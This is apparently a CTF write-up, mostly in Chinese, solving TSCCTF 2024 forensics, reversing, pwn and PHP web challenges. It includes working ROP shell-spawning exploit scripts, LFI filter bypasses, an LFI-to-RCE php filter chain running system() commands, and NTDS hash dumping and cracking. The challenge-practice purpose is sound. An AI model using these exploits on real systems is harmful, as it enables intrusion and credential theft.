2024 # Misc # AKA # Source Code # :::spoiler IDA\n__int64 flag_function() { // [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-\u0026#34;+\u0026#34; TO EXPAND] num_of_files = 0; sub_14000A6C0(); here_dll = LoadLibraryA(\u0026#34;here.dll\u0026#34;); flag_dll = LoadLibraryA(\u0026#34;flag.dll\u0026#34;); ghost_dll = LoadLibraryA(\u0026#34;ghost.dll\u0026#34;); strcpy(FileName, \u0026#34;.\\\\*.*\u0026#34;); FirstFileA = FindFirstFileA(FileName, \u0026amp;FindFileData); while ( FindNextFileA(FirstFileA, \u0026amp;FindFileData) ) { while ( *(_WORD *)FindFileData.cFileName != 46 \u0026amp;\u0026amp; (*(_WORD *)FindFileData.cFileName != 11822 || FindFileData.cFileName[2]) ) { num_of_files += (GetFileAttributesA(FindFileData.cFileName) \u0026amp; 0x10) == 0; if ( !FindNextFileA(FirstFileA, \u0026amp;FindFileData) ) goto LABEL_6; } } LABEL_6: FindClose(FirstFileA); if ( num_of_files \u0026gt; 2 ) { v6 = strcpy(buf, \u0026#34;We don\u0026#39;t want too many files here.\u0026#34;); puts(v6); v7 = strcpy(buf, \u0026#34;Files \u0026lt;= 2. You have \u0026#34;); v8 = (char *)sub_140071880(v7, (unsigned int)num_of_files); v9 = strcpy(v8, \u0026#34; file(s).\u0026#34;); puts(v9); v10 = strcpy(buf, \u0026#34;Hint: Did you have short name?\u0026#34;); puts(v10); return 0i64; } if ( !here_dll ) { if ( !ghost_dll ) { if ( !flag_dll ) { v12 = strcpy(buf, \u0026#34;DLL load failed.\u0026#34;); puts(v12); goto LABEL_12; } hint = (void (*)(void))GetProcAddress(flag_dll, \u0026#34;hint\u0026#34;); if ( !hint ) goto LABEL_12; goto LABEL_11; } goto LABEL_16; } if ( ghost_dll ) { LABEL_16: hint = (void (*)(void))GetProcAddress(ghost_dll, \u0026#34;Roflcopter\u0026#34;); if ( !hint ) goto LABEL_12; goto LABEL_11; } if ( !flag_dll ) { hint = (void (*)(void))GetProcAddress(here_dll, \u0026#34;hint\u0026#34;); if ( !hint ) { LABEL_12: FreeLibrary(here_dll); FreeLibrary(flag_dll); FreeLibrary(ghost_dll); return 0i64; } LABEL_11: hint(); goto LABEL_12; } flag = (void (*)(void))GetProcAddress(flag_dll, \u0026#34;flag\u0026#34;); if ( flag ) flag(); return 0i64; } :::\nRecon # 題目給了vmdk file，先用Autopsy開，可以撈出ghost.dll和where_is_the_dll.exe兩個檔案 逆向一下會發現關鍵的code如上，接著就是考驗逆向的功力，可以稍微喵一下dll裡面export出的東西有flag, Roflcopter和hint這三個function 不過看PE file中有提到執行資料夾中只允許有兩個file\nif ( num_of_files \u0026gt; 2 ) { v6 = strcpy(buf, \u0026#34;We don\u0026#39;t want too many files here.\u0026#34;); puts(v6); v7 = strcpy(buf, \u0026#34;Files \u0026lt;= 2. You have \u0026#34;); v8 = (char *)sub_140071880(v7, (unsigned int)num_of_files); v9 = strcpy(v8, \u0026#34; file(s).\u0026#34;); puts(v9); v10 = strcpy(buf, \u0026#34;Hint: Did you have short name?\u0026#34;); puts(v10); return 0i64; } 並且下面接續一些判斷有無把dll成功load進來的一些判斷，所以一開始的想法是直接patch，讓他可以不需要管有多少檔案在同一個資料夾，另外一件事情是我們的目標應該會放在最後幾行\nflag = (void (*)(void))GetProcAddress(flag_dll, \u0026#34;flag\u0026#34;); if ( flag ) flag(); return 0i64; 但是如果直接讓他跳到這邊，會因為一開始沒有load進相對應的dll而發生segmentation fault，正確的做法如下\nExploit # 首先把ghost.dll改成flag.dll，並且複製一份再rename成here.dll\n$ ll total 4240 drwxrwxrwx 1 sbk6401 sbk6401 4096 Jan 19 20:11 . drwxrwxrwx 1 sbk6401 sbk6401 4096 Jan 19 22:09 .. -rwxrwxrwx 1 sbk6401 sbk6401 46 Jan 19 20:11 final_patch.1337 -rwxrwxrwx 1 sbk6401 sbk6401 1700882 Jan 19 18:32 flag.dll -rwxrwxrwx 1 sbk6401 sbk6401 1700882 Jan 19 18:32 here.dll -rwxrwxrwx 1 sbk6401 sbk6401 931328 Jan 19 18:32 where_is_the_dll.exe 仔細看這樣的配置就會讓code直接執行到最後幾行，並且因為有成功load到flag.dll所以可以執行flag function，只是需要把判斷folder中有多少file的判斷patch掉 Flag: TSC{nTF$_IS_w3ird}\nRGB # Recon # 這一題也是算新瓶裝舊酒，如果把圖片丟到stegsolve並按照RGB各單一顏色區分會發現有三張不同的QRcode，拿到online tool掃描之後會出現三段FLAG，把三段拼起來就是了\nExploit # flag_1 = \u0026#34;T{5_e3V15r63o_O0_ErNnCV11M45RW7\u0026#34; flag_2 = \u0026#34;SR34_D13_3L_k0_ma_3_D0444a1_3h3\u0026#34; flag_3 = \u0026#34;C05Rr_07A_UY0Np5R934_n1r_j1A_1}\u0026#34; real_flag = \u0026#34;\u0026#34; for i in range(len(flag_1)): real_flag += flag_1[i] real_flag += flag_2[i] real_flag += flag_3[i] print(real_flag) Flag: TSC{R0535_4Re_r3D_V101375_Ar3_6LU3_Yok0_0NO_p0m5_aRE_9r33N_4nD_C0nV4114r14_Maj4115_AR3_Wh173}\nThere is nothing here(1) # Recon # 看來我的道行還是太淺了，感謝@Salmon 給的提示，我一開始直覺也是改寬度，但是之前只有寫過bmp / png的題目，不知道jpeg怎麼改，所以就歪樓想到別的地方，繞來繞去還是回歸原點，因為題目有提示這是一個square view，所以應該是把圖片的長寬都改成04 00，就可以看到qrcode了，再利用stegsolve把其中一個顏色的channel extract出來，丟到online scanner就可以拿到flag了 :::spoiler Flag QR Code :::\nFlag: TSC{Wh47_yoU_53e_IS_noT_Wh@t_YoU_9Et}\nThere is nothing here(2) # Recon # 由於之前第一題解不出來，所以先寫這一題，題目敘述有提到要先找問題，但我是直接開始解XDD，然後過不期然不知道要寫啥，開ticket詢問一下這一題是否和前一題有關，得到肯定的回覆後才回頭處理第一題，浪費了一些時間\nModify JPG 題目只有給一個vhdx的檔案，所以我就直接丟到FTK隨便搜一下，發現了AD的一些hive file和一張jpg圖片，一想到和前一題有關就果斷想說要改長寬，果不其然，發現了題目真正問的問題是要解決AD中admin帳號的密碼爆破(原本是01 18 01 cc) Hashcat in Kali 我是參考 Password Cracking Using Hashcat and NTDS.dit | Cyber Security Tutorial 這部影片的作法(雖然之前玩AD的時候也有寫過，但我懶得翻筆記)，首先要先用impacket/secretsdump.py把==ntds.dit==和==SYSTEM== hive file的資訊彙整起來\n$ ./secretsdump.py -ntds ./Active\\ Directory/ntds.dit -system ./registry/SYSTEM LOCAL -outputfile ./myhashes.txt Impacket v0.11.0 - Copyright 2023 Fortra [*] Target system bootKey: 0xa8b93f7180a58e68855a3bc7b78a2fee [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Searching for pekList, be patient [*] PEK # 0 found and decrypted: e1464646eb31cceb90499786c54c1fea [*] Reading and decrypting hashes from ./Active Directory/ntds.dit Administrator:500:aad3b435b51404eeaad3b435b51404ee:674e48b68c5cd0efd8f7e5faa87b3d1e::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: WIN-D0GK9NN045J$:1000:aad3b435b51404eeaad3b435b51404ee:8992db8791f94857ffeaad27b67b8dc1::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6ec996e19cc73dffb3f966de98837ebe::: [*] Kerberos keys from ./Active Directory/ntds.dit Administrator:aes256-cts-hmac-sha1-96:03a66dff72701640eaa7d8525cb9a93a22cd65dea5def40c0c55d6cce5a4c56d Administrator:aes128-cts-hmac-sha1-96:ebdf0b0b151ee52d372429ef1e4ac45d Administrator:des-cbc-md5:c19b6bf4d9d3b361 WIN-D0GK9NN045J$:aes256-cts-hmac-sha1-96:cfb8bf03caea33ebfd870400b49b5d0f53a5675ace7866baed26d1ebb0da67f9 WIN-D0GK9NN045J$:aes128-cts-hmac-sha1-96:8069ceb2edc5ac4f76a8c595f2a09ee3 WIN-D0GK9NN045J$:des-cbc-md5:3d3de59e9162ea6b krbtgt:aes256-cts-hmac-sha1-96:534850fe38ca92f7a687fc98d8282fbabb717a2803032e11f2b4b5d05f226545 krbtgt:aes128-cts-hmac-sha1-96:835a3f9fd0a75f82d4ebed41441b01db krbtgt:des-cbc-md5:86290bba68d58c23 [*] Cleaning up... $ cat myhashes.txt.ntds Administrator:500:aad3b435b51404eeaad3b435b51404ee:674e48b68c5cd0efd8f7e5faa87b3d1e::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: WIN-D0GK9NN045J$:1000:aad3b435b51404eeaad3b435b51404ee:8992db8791f94857ffeaad27b67b8dc1::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6ec996e19cc73dffb3f966de98837ebe::: 接著才是用hashcat去爆破，而作者也很好心的把wordlist都整理好了\n$ hashcat -m 1000 ./myhashes.txt.ntds ./fasttrack.txt $ hashcat -m 1000 ./myhashes.txt.ntds ./fasttrack.txt --show --username Administrator:674e48b68c5cd0efd8f7e5faa87b3d1e:welcome Guest:31d6cfe0d16ae931b73c59d7e0c089c0: DefaultAccount:31d6cfe0d16ae931b73c59d7e0c089c0: 現在我們知道一部分的flag，也就是Admin的密碼為welcome，雖然直接在網路上的一些NTLM db搜尋也可以找的到這一組經典的密碼，不過就還是練習一下正規的操作\nDomain in SYSTEM hive 另一個flag也就是AD的FQDN，可以從SYSTEM hive中的SYSTEM/ControlSet001/Service/Tcpip/Parameters中找到 而理論上來說FQDN應該是[hostname].[domain]兩個串在一起才是unique FQDN，但作者說其實只需要domain就好，所以最後的flag會是TSC{tsc_ctf_AD.local_welcome}\nFlag: TSC{tsc_ctf_AD.local_welcome}\nTL;DL # Hint # Hint 1 len(flag) \u0026gt; 20\nHint 2 How many channels does the audio file have?\nHint 3 Cogito, ergo sum\nHint 4 Are you familiar with the tool used to display signal voltages?\nHint 5 Recon # 這一題真的太難了，不過也是有一點有趣，Hint也是給了超多但還是只有一個人解出來，@ywc真的太鬼了這一題也是賽後解 從題目給的hint可以知道1. 笛卡爾, 2. 直角坐標, 3. 音頻振幅 此時針對這種腦動就要越開越好，如果把振幅畫出來會怎麼樣呢?其實就是這麼簡單，但綜觀網路上的資源或是之前打過的題目都沒有這樣類似的題目，所以自己寫個script如下，嘗試把圖案畫出來。\n:::info 順帶一提，看了@ywc大神的WP後才知道其實沒有那麼通靈，因為一開始import進去Audacity後雖然看似啥都沒有，我也按照之前的經驗用頻譜去看，但是依然只有看似是摩斯密碼的東西，此時只要採用正規劃就可以看出一些些端倪了 :::\nExploit # 順帶一題，讀取這一題的音檔不能用wave這個library，因為這一題的音檔不是一個標準的PCM編碼的.wav檔案。wave library只支援PCM編碼的.wav檔案。\nfrom scipy.io import wavfile import matplotlib.pyplot as plt sample_rate, data = wavfile.read(\u0026#39;./TSCCTF 2024/Misc/TL;DL/flag-tldl.wav\u0026#39;) left_channel = data[:, 0] right_channel = data[:, 1] plt.figure() plt.plot(left_channel, right_channel) # Add labels plt.xlabel(\u0026#39;x\u0026#39;) plt.ylabel(\u0026#39;y\u0026#39;) plt.title(\u0026#39;A simple plot\u0026#39;) plt.show() Flag: TSC{V3ry_10Ud_d1R3c7_CUrR3N7_Bu7_1n_32-b17_f1047}\nReverse # sHELLcode # Source Code # :::spoiler IDA main function\nint __cdecl main(int argc, const char **argv, const char **envp) { int v3; // eax const char *v5; // ebx int v6; // eax int v7; // eax unsigned int i; // [esp+1Ch] [ebp-8h] __main(); if ( argc == 1 ) { v3 = std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cout, \u0026#34;./sHELLcode.exe \u0026lt;Flag\u0026gt;\u0026#34;); std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(v3, 10); return 0; } else if ( strlen(argv[1]) == 33 ) { for ( i = 0; i \u0026lt;= 0x84; ++i ) code[i] ^= 0x87u; if ( (*(int (__cdecl **)(const char *))code)(argv[1]) ) { v5 = argv[1]; v6 = std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cout, \u0026#34;Here is your flag: \u0026#34;); v7 = std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(v6, v5); std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(v7, 10); } return 0; } else { return 0; } } :::\nRecon # 這個也是有點有趣，也是算水題，但意義深遠，可以看到原本的code中有一個function pointer，在開始check flag之前做了decrypt，所以一開始的確不知道原本在做甚麼，但只要使用工人智慧把這一段patch掉，再用IDA重新幫忙反組譯，就可以寫script了\nenc_code = [ 0xD2, 0x0E, 0x62, 0xD4, 0x04, 0x6B, 0x93, 0x0A, 0xC2, 0x74, 0x40, 0x87, 0xE4, 0xBF, 0xB0, 0xB1, 0xE1, 0x40, 0xC7, 0x83, 0xB4, 0x87, 0x40, 0xC2, 0x7F, 0x87, 0x87, 0x87, 0x87, 0x04, 0xFA, 0x7F, 0xA7, 0xF8, 0xD1, 0x0C, 0xC2, 0x7F, 0x0C, 0x9B, 0x02, 0xE7, 0xC6, 0xC7, 0x87, 0x0C, 0xD2, 0x7F, 0x0C, 0xC2, 0x8F, 0x86, 0x57, 0x88, 0x31, 0x87, 0x0F, 0xC2, 0x6C, 0x0C, 0xCA, 0x7F, 0x3D, 0xE0, 0xE1, 0xE1, 0xE1, 0x0E, 0x4F, 0x70, 0x6D, 0x56, 0x7D, 0x0E, 0x4F, 0x46, 0x7F, 0x98, 0xAE, 0x45, 0x0E, 0x57, 0x0E, 0x45, 0x46, 0x65, 0x85, 0x86, 0x45, 0x0E, 0x4F, 0xAE, 0x57, 0x88, 0x31, 0xC3, 0x82, 0x74, 0xB5, 0xC2, 0x6C, 0x88, 0x39, 0x47, 0xBE, 0x44, 0xF3, 0x80, 0x3F, 0x87, 0x87, 0x87, 0x87, 0x6C, 0x8C, 0x04, 0xC2, 0x7F, 0x86, 0x6C, 0x23, 0x3F, 0x86, 0x87, 0x87, 0x87, 0x04, 0x43, 0x93, 0xDC, 0xDA, 0x44, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00] real_code = [] for i in range(0x84): real_code.append(\u0026#34;{:02x}\u0026#34;.format(enc_code[i] ^ 0x87)) print(\u0026#34; \u0026#34;.join(real_code)) # 55 89 e5 53 83 ec 14 8d 45 f3 c7 00 63 38 37 36 66 c7 40 04 33 00 c7 45 f8 00 00 00 00 83 7d f8 20 7f 56 8b 45 f8 8b 1c 85 60 41 40 00 8b 55 f8 8b 45 08 01 d0 0f b6 00 88 45 eb 8b 4d f8 ba 67 66 66 66 89 c8 f7 ea d1 fa 89 c8 c1 f8 1f 29 c2 89 d0 89 c2 c1 e2 02 01 c2 89 c8 29 d0 0f b6 44 05 f3 32 45 eb 0f be c0 39 c3 74 07 b8 00 00 00 00 eb 0b 83 45 f8 01 eb a4 b8 01 00 00 00 83 c4 14 5b 5d c3 把原本encrypted code的地方改掉，再重新disassemble一下，更新如下:\nint __cdecl code(int flag) { _BYTE v2[9]; // [esp+Bh] [ebp-Dh] BYREF strcpy(v2, \u0026#34;c8763\u0026#34;); v2[6] = 0; *(_WORD *)\u0026amp;v2[7] = 0; while ( *(int *)\u0026amp;v2[5] \u0026lt;= 32 ) { if ( check_string[*(_DWORD *)\u0026amp;v2[5]] != (char)(*(_BYTE *)(*(_DWORD *)\u0026amp;v2[5] + flag) ^ v2[*(_DWORD *)\u0026amp;v2[5] % 5]) ) return 0; ++*(_DWORD *)\u0026amp;v2[5]; } return 1; } Exploit # enc_flag = [0x37, 0x7B, 0x7B, 0x75, 0x67, 0x25, 0x43, 0x79, 0x59, 0x44, 0x3C, 0x4D, 0x45, 0x69, 0x72, 0x3C, 0x4B, 0x7F, 0x73, 0x7F, 0x2F, 0x5B, 0x58, 0x52, 0x56, 0x3C, 0x75, 0x03, 0x45, 0x67, 0x06, 0x4A, 0x4A] key = [51, 54, 55, 56, 99] key = [0x63, 0x38, 0x37, 0x36, 0x33] flag = \u0026#34;\u0026#34; for i in range(33): flag += chr(enc_flag[i] ^ key[i % 5]) print(flag) Flag: TCLCTF{Now_ur_A_sHELLcode_M4sTer}\nPWN # ret2libc # Source Code # #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; int main(){ setvbuf(stdin, 0, 2, 0); setvbuf(stdout, 0, 2, 0); puts(\u0026#34;Do you know the libc?\u0026#34;); char str[0x20]; scanf(\u0026#34;%s\u0026#34;, str); getchar(); printf(str); gets(str); return 0; } Recon # 這一題的環境很搞，我覺得以只有上過社團的新手來說應該很難，畢竟都是基本功，但說實話，用到format bug string的實用度真的不高\n從source code中可以發現簡單的format bug和bof的問題，所以大膽猜測先leak stack info，然後拿到libc base 接著用到後面的gets達到bof + rop，然後他有開canary，所以記得canary也要放對 Exploit - FBS + ret2libc + BoF + ROP # :::success 到這邊應該很簡單，local也是一下子就過了，但不知道為甚麼，我發現題目給的libc.so.6和server端的不一樣，一直debug都沒有甚麼好結果，後來還是乾脆開docker在local端跑一下環境，結果竟然發現ROP的gadget真的對不到，應該說只有pop rdx ; pop rbx ; ret這個gadget發生問題，所以我也是直接copy出docker的libc才過的，真的是傻眼\u0026hellip; :::\nfrom pwn import * # r = process(\u0026#39;./ret2libc\u0026#39;, env={\u0026#34;LD_PRELOAD\u0026#34; : \u0026#34;./libc.so.6\u0026#34;}) r = remote(\u0026#39;172.31.210.1\u0026#39;, 50002) print(r.recvline()) payload = b\u0026#39;%p\u0026#39; * 14 + b\u0026#39;^\u0026#39; r.sendline(payload) stack_info = r.recvuntil(b\u0026#39;^\u0026#39;)[:-1].replace(b\u0026#39;(nil)\u0026#39;, b\u0026#39;0xdeadbeef\u0026#39;).split(b\u0026#39;0x\u0026#39;) canary = int(stack_info[-4], 16) libc_main = int(stack_info[-2], 16) libc_base = libc_main - 0x24083# 0x29d90 log.info(f\u0026#39;{stack_info}\u0026#39;) log.info(f\u0026#39;{hex(libc_main)}\u0026#39;) log.info(f\u0026#39;{hex(libc_base)}\u0026#39;) log.info(f\u0026#39;{hex(canary)}\u0026#39;) pop_rax_ret = libc_base + 0x0000000000036174# 0x0000000000045eb0# : pop rax ; ret pop_rdi_ret = libc_base + 0x0000000000023b6a# 0x000000000002a3e5# : pop rdi ; ret pop_rsi_ret = libc_base + 0x000000000002601f# 0x000000000002be51# : pop rsi ; ret pop_rdx_rbx_ret = libc_base + 0x0000000000015fae6# 0x00000000000904a9# : pop rdx ; pop rbx ; ret bin_sh = libc_base + 0x00000000001b45bd# 0x00000000001d8678# : /bin/sh syscall_ret = libc_base + 0x000000000002284d# 0x0000000000091316# : r.sendline(b\u0026#39;a\u0026#39; * 0x28 + p64(canary) + p64(1) + p64(pop_rax_ret) + p64(0x3b) + p64(pop_rdi_ret) + p64(bin_sh) + p64(pop_rsi_ret) + p64(0) + p64(pop_rdx_rbx_ret) + p64(0) + p64(0) + p64(syscall_ret)) r.interactive() ret2win # Exploit - 就是簡單到不能再簡單的ret2win # from pwn import * r = remote(\u0026#39;172.31.210.1\u0026#39;, 50001) # r = process(\u0026#39;./ret2win\u0026#39;) r.recvline() fn_win_addr = 0x000000000401196 r.sendline(b\u0026#39;a\u0026#39; * 0x28 + p64(fn_win_addr)) r.interactive() Web # [教學題] 極之番『漩渦』 # Recon # 這一題有四小題，都是和PHP相關的洞，應該是個對新手都很有感覺的題目\n弱型別 + List :::spoiler Source Code\n\u0026lt;?php include(\u0026#39;config.php\u0026#39;); echo \u0026#39;\u0026lt;h1\u0026gt;👻 Stage 1 / 4\u0026lt;/h1\u0026gt;\u0026#39;; $A = $_GET[\u0026#39;A\u0026#39;]; $B = $_GET[\u0026#39;B\u0026#39;]; highlight_file(__FILE__); echo \u0026#39;\u0026lt;hr\u0026gt;\u0026#39;; if (isset($A) \u0026amp;\u0026amp; isset($B)) if ($A != $B) if (strcmp($A, $B) == 0) if (md5($A) === md5($B)) echo \u0026#34;\u0026lt;a href=$stage2\u0026gt;Go to stage2\u0026lt;/a\u0026gt;\u0026#34;; else die(\u0026#39;ERROR: MD5(A) != MD5(B)\u0026#39;); else die(\u0026#39;ERROR: strcmp(A, B) != 0\u0026#39;); else die(\u0026#39;ERROR: A == B\u0026#39;); else die(\u0026#39;ERROR: A, B should be given\u0026#39;); ::: 觀察source code會發現就是一個md5 collision的經典題目，不過他還有一個限制，就是strcmp($A, $B) == 0，這是和之前遇到的題目不太一樣的地方，後來是參考Bypassing PHP strcmp()的文章，內文提到\n== is an insecure comparison (loose comparison known as the Equal Operator) if the two strings are equal to each other then it returns true, this does not check data types. If we submit an empty array token[]=something PHP translates GET variables like this to an empty array which causes strcmp() to barf: strcmp(array(), \u0026ldquo;token\u0026rdquo;) -\u0026gt; NULL which will return 0\n意思是如果給的GET參數是個list，那PHP就會理解成0，因為他認為是個empty array，所以這一題和collision沒有關係，純粹是php的設計語言在弱型別以及語法上有\u0026quot;太多\u0026quot;的空間可以利用 Payload: http://172.31.210.1:33002/stage1.php?A[]=QNKCDZO\u0026amp;B[]=240610708 Collision Again :::spoiler Source Code\n\u0026lt;?php include(\u0026#39;config.php\u0026#39;); echo \u0026#39;\u0026lt;h1\u0026gt;👻 Stage 2 / 4\u0026lt;/h1\u0026gt;\u0026#39;; $A = $_GET[\u0026#39;A\u0026#39;]; $B = $_GET[\u0026#39;B\u0026#39;]; highlight_file(__FILE__); echo \u0026#39;\u0026lt;hr\u0026gt;\u0026#39;; if (isset($A) \u0026amp;\u0026amp; isset($B)) if ($A !== $B){ $is_same = md5($A) == 0 and md5($B) === 0; if ($is_same) echo (md5($B) ? \u0026#34;QQ1\u0026#34; : md5($A) == 0 ? \u0026#34;\u0026lt;a href=$stage3?page=swirl.php\u0026gt;Go to stage3\u0026lt;/a\u0026gt;\u0026#34; : \u0026#34;QQ2\u0026#34;); else die(\u0026#39;ERROR: $is_same is false\u0026#39;); } else die(\u0026#39;ERROR: A, B should be given\u0026#39;); ::: 這一題沒有想太多就直接用前一題的payload送出去，結果payload太強大就過了==，後來是仔細去看教學才知道他的考點，簡單來說，在php中，=的運算優先度是高於and運算的，所以送出前一題的payload，會通過#13的判斷，因為即時後面是一個false也沒差，接著就是一個三層的if statement，用python的角度解釋就會變成\nif md5(B): result = \u0026#34;QQ1\u0026#34; else: if md5(A) == 0: result = \u0026#34;\u0026lt;a href={0}?page=swirl.php\u0026gt;Go to stage3\u0026lt;/a\u0026gt;\u0026#34;.format(stage3) else: result = \u0026#34;QQ2\u0026#34; 而因為$B本來就沒東西，所以會進到else，必且md5($A)是true，所以會return Stage 3的link給我們 Payload: http://172.31.210.1:33002/stage2_212ad0bdc4777028af057616450f6654.php/?A[]=QNKCDZO\u0026amp;B[]=240610708 LFI :::spoiler Source Code\n\u0026lt;?php include(\u0026#39;config.php\u0026#39;); echo \u0026#39;\u0026lt;h1\u0026gt;👻 Stage 3 / 4\u0026lt;/h1\u0026gt;\u0026#39;; $page = $_GET[\u0026#39;page\u0026#39;]; highlight_file(__FILE__); echo \u0026#39;\u0026lt;hr\u0026gt;\u0026#39;; if (isset($page)) { $path = strtolower($_GET[\u0026#39;page\u0026#39;]); // filter \\ _ / if (preg_match(\u0026#34;/\\\\_|\\//\u0026#34;, $path)) { echo \u0026#34;\u0026lt;p\u0026gt;bad hecker detect! \u0026lt;/p\u0026gt;\u0026#34;; }else{ $path = str_replace(\u0026#34;..\\\\\u0026#34;, \u0026#34;../\u0026#34;, $path); $path = str_replace(\u0026#34;..\u0026#34;, \u0026#34;.\u0026#34;, $path); echo $path; echo \u0026#39;\u0026lt;hr\u0026gt;\u0026#39;; echo file_get_contents(\u0026#34;./page/\u0026#34;.$path); } } else die(\u0026#39;ERROR: page should be given\u0026#39;); ::: 這個小題是個簡單的LFI，要找的檔案其實就是config.php(不然其實也不知道要找甚麼)，關鍵的地方在於他有設filter，簡單bypass一下就過了(把../變成....%5c就可以了)，取得config.php後就打開source code inspect一下就知道關鍵stage 4的link了 Payload: http://172.31.210.1:33002/stage3_099b3b060154898840f0ebdfb46ec78f.php?page=....%5cconfig.php LFI2RCE - PHP Filter Chain 這一題是最難的，最後忍不住還是去看了教學，但跟著做還是要花好久的功夫才能打穿，這一題就是典型的LFI2RCE的題目，一開始是看飛飛的文章，發現他可以成功query../../../../../proc/self/environ這個東西，所以有一大半時間都在找如何用這個東西inject webshell達到RCE，但不確定是權限不夠還是怎麼樣，過程中困難重重也沒有快要成功的跡象，因此就只能嘗試教學中提到的php filter chain，話說steven的文章很優質耶，已經是一個php lfi2rce的教科書了，重點是察看的payload來源於wupco大的script也是怎麼試都不成功，最後是察看PHP filters chain: What is it and how to use it這篇文章才解決，我是用他們自己寫的script，不確定是哪個環節出問題\nExploit # Script For Stage 4\nimport requests import subprocess from sys import * url = \u0026#34;http://172.31.210.1:33002/stage4_b182g38e7db23o8eo8qwdehb23asd311.php\u0026#34; command = \u0026#34;\u0026#34; for i in argv[1:]: command += i + \u0026#39; \u0026#39; result = subprocess.Popen([\u0026#39;python\u0026#39;, \u0026#39;./php_filter_chain_generator/php_filter_chain_generator.py\u0026#39;, \u0026#39;--chain\u0026#39;, f\u0026#39;\u0026lt;?php system(\u0026#34;{command}\u0026#34;)?\u0026gt;\u0026#39;], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True) payload, _ = result.communicate() # print(payload.splitlines()) data = {\u0026#34;👀\u0026#34;: payload.splitlines()[-1]} response = requests.post(url, data=data) print(response.text) $ python exp.py ls \u0026lt;h1\u0026gt;👻 Stage 4 / 4\u0026lt;/h1\u0026gt;\u0026lt;code\u0026gt;\u0026lt;span style=\u0026#34;color: #000000\u0026#34;\u0026gt; \u0026lt;span style=\u0026#34;color: #0000BB\u0026#34;\u0026gt;\u0026amp;lt;?php\u0026lt;br /\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;span style=\u0026#34;color: #007700\u0026#34;\u0026gt;echo\u0026amp;nbsp;\u0026lt;/span\u0026gt;\u0026lt;span style=\u0026#34;color: #DD0000\u0026#34;\u0026gt;\u0026#39;\u0026amp;lt;h1\u0026amp;gt;👻\u0026amp;nbsp;Stage\u0026amp;nbsp;4\u0026amp;nbsp;/\u0026amp;nbsp;4\u0026amp;lt;/h1\u0026amp;gt;\u0026#39;\u0026lt;/span\u0026gt;\u0026lt;span style=\u0026#34;color: #007700\u0026#34;\u0026gt;;\u0026lt;br /\u0026gt;\u0026lt;br /\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;span style=\u0026#34;color: #0000BB\u0026#34;\u0026gt;highlight_file\u0026lt;/span\u0026gt;\u0026lt;span style=\u0026#34;color: #007700\u0026#34;\u0026gt;(\u0026lt;/span\u0026gt;\u0026lt;span style=\u0026#34;color: #0000BB\u0026#34;\u0026gt;__FILE__\u0026lt;/span\u0026gt;\u0026lt;span style=\u0026#34;color: #007700\u0026#34;\u0026gt;);\u0026lt;br /\u0026gt;echo\u0026amp;nbsp;\u0026lt;/span\u0026gt;\u0026lt;span style=\u0026#34;color: #DD0000\u0026#34;\u0026gt;\u0026#39;\u0026amp;lt;hr\u0026amp;gt;\u0026#39;\u0026lt;/span\u0026gt;\u0026lt;span style=\u0026#34;color: #007700\u0026#34;\u0026gt;;\u0026lt;br /\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;span style=\u0026#34;color: #0000BB\u0026#34;\u0026gt;extract\u0026lt;/span\u0026gt;\u0026lt;span style=\u0026#34;color: #007700\u0026#34;\u0026gt;(\u0026lt;/span\u0026gt;\u0026lt;span style=\u0026#34;color: #0000BB\u0026#34;\u0026gt;$_POST\u0026lt;/span\u0026gt;\u0026lt;span style=\u0026#34;color: #007700\u0026#34;\u0026gt;);\u0026lt;br /\u0026gt;\u0026lt;br /\u0026gt;if\u0026amp;nbsp;(isset(\u0026lt;/span\u0026gt;\u0026lt;span style=\u0026#34;color: #0000BB\u0026#34;\u0026gt;$👀\u0026lt;/span\u0026gt;\u0026lt;span style=\u0026#34;color: #007700\u0026#34;\u0026gt;))\u0026amp;nbsp;\u0026lt;br /\u0026gt;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;include(\u0026lt;/span\u0026gt;\u0026lt;span style=\u0026#34;color: #0000BB\u0026#34;\u0026gt;$👀\u0026lt;/span\u0026gt;\u0026lt;span style=\u0026#34;color: #007700\u0026#34;\u0026gt;);\u0026lt;br /\u0026gt;else\u0026amp;nbsp;die(\u0026lt;/span\u0026gt;\u0026lt;span style=\u0026#34;color: #DD0000\u0026#34;\u0026gt;\u0026#39;ERROR:\u0026amp;nbsp;👀\u0026amp;nbsp;should\u0026amp;nbsp;be\u0026amp;nbsp;given\u0026#39;\u0026lt;/span\u0026gt;\u0026lt;span style=\u0026#34;color: #007700\u0026#34;\u0026gt;);\u0026lt;/span\u0026gt; \u0026lt;/span\u0026gt; \u0026lt;/code\u0026gt;\u0026lt;hr\u0026gt;bin boot dev etc flag_cr14x5hc home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var � 